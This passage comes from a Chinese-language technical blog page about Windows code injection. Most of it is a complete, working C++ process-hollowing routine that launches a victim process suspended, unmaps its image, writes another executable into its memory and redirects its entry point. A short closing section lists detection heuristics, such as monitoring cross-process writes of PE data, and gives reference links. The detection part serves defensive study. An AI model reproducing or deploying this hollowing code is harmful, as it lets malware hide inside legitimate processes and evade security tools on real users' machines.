class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">InjectProcess</span><span class="params">(LPTSTR VictimFile,LPTSTR InjectExe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> HANDLE hFile;</span><br><span class="line"> DWORD dwFileSize;    <span class="comment">//文件大小</span></span><br><span class="line"> IMAGE_DOS_HEADER DosHeader;</span><br><span class="line"> IMAGE_NT_HEADERS NtHeader;</span><br><span class="line"> PROCESS_INFORMATION pi;</span><br><span class="line"> STARTUPINFO si;</span><br><span class="line"> CONTEXT context;</span><br><span class="line"> PVOID ImageBase;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> ImageSize;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> BaseAddr;</span><br><span class="line"> <span class="type">unsigned</span> <span class="type">long</span> retByte = <span class="number">0</span>;</span><br><span class="line"> LONG offset;</span><br><span class="line"> HMODULE hNtDll=<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line"> <span class="keyword">if</span>(!hNtDll)</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> ZWUNMAPVIEWOFSECTION ZwUnmapViewOfSection = (ZWUNMAPVIEWOFSECTION)<span class="built_in">GetProcAddress</span>(hNtDll,<span class="string">&quot;ZwUnmapViewOfSection&quot;</span>);</span><br><span class="line"> <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="built_in">sizeof</span>(si));</span><br><span class="line"> <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="built_in">sizeof</span>(pi));</span><br><span class="line"> si.cb = <span class="built_in">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line"> hFile = ::<span class="built_in">CreateFile</span>(InjectExe,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_WRITE,<span class="literal">NULL</span>,OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,<span class="literal">NULL</span>);</span><br><span class="line"> <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line"> &#123;</span><br><span class="line">  <span class="keyword">return</span> FALSE;</span><br><span class="line"> &#125;</span><br><span class="line"> ::<span class="built_in">SetFilePointer</span>(hFile, <span class="number">0</span>, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line"> dwFileSize = ::<span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"> LPBYTE pBuf = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line"> <span class="built_in">memset</span>(pBuf, <span class="number">0</span>, dwFileSize);</span><br><span class="line"> DWORD dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    ::<span class="built_in">ReadFile</span>( hFile</span><br><span class="line">        , pBuf</span><br><span class="line">        , dwFileSize</span><br><span class="line">        , &amp;dwNumberOfBytesRead</span><br><span class="line">        , <span class="literal">NULL</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;DosHeader,pBuf,<span class="built_in">sizeof</span>(IMAGE_DOS_HEADER));</span><br><span class="line"> ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;NtHeader,&amp;pBuf[DosHeader.e_lfanew],<span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"> <span class="comment">//检查PE结构</span></span><br><span class="line"> <span class="comment">//以挂起方式进程</span></span><br><span class="line"> BOOL res = <span class="built_in">CreateProcess</span>(<span class="literal">NULL</span>,VictimFile,<span class="literal">NULL</span>,<span class="literal">NULL</span>,FALSE,CREATE_SUSPENDED,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;si,&amp;pi); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> &#123;</span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">GetThreadContext</span>(pi.hThread,&amp;context))  <span class="comment">//如果调用失败</span></span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">ReadProcessMemory</span>(pi.hProcess,(<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>),&amp;BaseAddr,<span class="built_in">sizeof</span>(<span class="type">unsigned</span> <span class="type">long</span>),<span class="literal">NULL</span>);</span><br><span class="line">  <span class="keyword">if</span> (!BaseAddr)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//拆卸傀儡进程内存模块</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">ZwUnmapViewOfSection</span>((<span class="type">unsigned</span> <span class="type">long</span>)pi.hProcess,BaseAddr))</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;</span><br><span class="line">  ImageBase = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, </span><br><span class="line">   (<span class="type">void</span> *)NtHeader.OptionalHeader.ImageBase,</span><br><span class="line">   NtHeader.OptionalHeader.SizeOfImage, </span><br><span class="line">   MEM_RESERVE|MEM_COMMIT, </span><br><span class="line">   PAGE_EXECUTE_READWRITE);  <span class="comment">//ImageBase 0x00400000</span></span><br><span class="line">  <span class="keyword">if</span> (ImageBase == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag = <span class="built_in">GetLastError</span>();</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line">   <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line">   <span class="keyword">return</span> FALSE;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="comment">//替换傀儡进程内存数据</span></span><br><span class="line">  <span class="keyword">if</span>(!<span class="built_in">WriteProcessMemory</span>(pi.hProcess, ImageBase, pBuf, NtHeader.OptionalHeader.SizeOfHeaders, &amp;retByte))</span><br><span class="line">  &#123;</span><br><span class="line">   DWORD wrongFlag2 = <span class="built_in">GetLastError</span>();  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//DOS 头 + PE 头 + 区块表的总大小</span></span><br><span class="line">  <span class="comment">//定位到区块头</span></span><br><span class="line">  offset = DosHeader.e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS);</span><br><span class="line">  IMAGE_SECTION_HEADER secHeader;</span><br><span class="line">  WORD i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (;i &lt; NtHeader.FileHeader.NumberOfSections;i++)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//定位到各个区块</span></span><br><span class="line">   ::<span class="built_in">CopyMemory</span>((<span class="type">void</span> *)&amp;secHeader, &amp;pBuf[offset + i*<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER)],<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER));</span><br><span class="line">   <span class="built_in">WriteProcessMemory</span>(pi.hProcess,(LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress),&amp;pBuf[secHeader.PointerToRawData],secHeader.SizeOfRawData,&amp;retByte);</span><br><span class="line">   <span class="built_in">VirtualProtectEx</span>(pi.hProcess, (LPVOID)((DWORD)ImageBase + secHeader.VirtualAddress), secHeader.Misc.VirtualSize, PAGE_EXECUTE_READWRITE,&amp;BaseAddr);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  context.ContextFlags = CONTEXT_FULL;</span><br><span class="line">  <span class="comment">//重置 执行文件入口</span></span><br><span class="line">  <span class="built_in">WriteProcessMemory</span>(pi.hProcess, (<span class="type">void</span> *)(context.Ebx + <span class="number">8</span>), </span><br><span class="line">   &amp;ImageBase,   <span class="comment">//4194304</span></span><br><span class="line">   <span class="number">4</span>, &amp;retByte);</span><br><span class="line">  context.Eax = (<span class="type">unsigned</span> <span class="type">long</span>)ImageBase + NtHeader.OptionalHeader.AddressOfEntryPoint;</span><br><span class="line">  <span class="built_in">SetThreadContext</span>(pi.hThread,&amp;context);</span><br><span class="line">  <span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"> <span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"> ::<span class="built_in">CloseHandle</span>(hFile);  </span><br><span class="line"> <span class="keyword">delete</span>[] pBuf;</span><br><span class="line"> <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-检测方法"><a href="#2-检测方法" class="headerlink" title="2. 检测方法"></a>2. 检测方法</h2><ol>
-<li>注册表相关注入继续可以通过Hook写注册表相关API实现监控</li>
-<li>SetWindowsHookEx则需要检查最后一个参数是否为0，为0表示全局注入，这是我们<br>  关注的地方。但是输入法之类的正常程序也可能使用注入技术。</li>
-<li>CreateRemoteThread进程注入比较复杂，核心要点是要有跨进程写入数据的动作，<br>  后续从两个维度来进行检查</li>
-</ol>
-<h3 id="2-1-检查跨进程写入的数据"><a href="#2-1-检查跨进程写入的数据" class="headerlink" title="2.1 检查跨进程写入的数据"></a>2.1 检查跨进程写入的数据</h3><p>虽然WriteProcessMemory的底层API经常被Windows底层用作数据传递，但是通过<br>特征可以识别出来</p>
-<ol>
-<li>写入的数据是PE文件</li>
-<li>写入的数据里包含.dll (一般是DLL文件名，或者是导入表相关数据)</li>
-<li>写入超长数据</li>
-</ol>
-<h3 id="2-2-检查线程代码执行部分地址"><a href="#2-2-检查线程代码执行部分地址" class="headerlink" title="2.2 检查线程代码执行部分地址"></a>2.2 检查线程代码执行部分地址</h3><p>检查代码地址是否在WriteProcessMemory写入的数据区域之内</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">Windows DLL Injection Basics</a></li>
-<li><a target="_blank" rel="noopener" href="http://blog.csdn.net/evi10r/article/details/6745138">使用异步过程调用（APC）实现模块注入</a></li>
-<li><a target="_blank" rel="noopener" href="http://bbs.pediy.com/showthread.php?t=99206">Ring3下WX方法结束微点2009</a></li>
-<li><a target="_blank" rel="noopener" href="http://blog.w4kfu.com/tag/duqu">New method of injection</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.i7s3curi7y.com/win32-code-injection-techniques">The Ultimate Win32 code injection Reference</a></li>
 </ul>
 
       
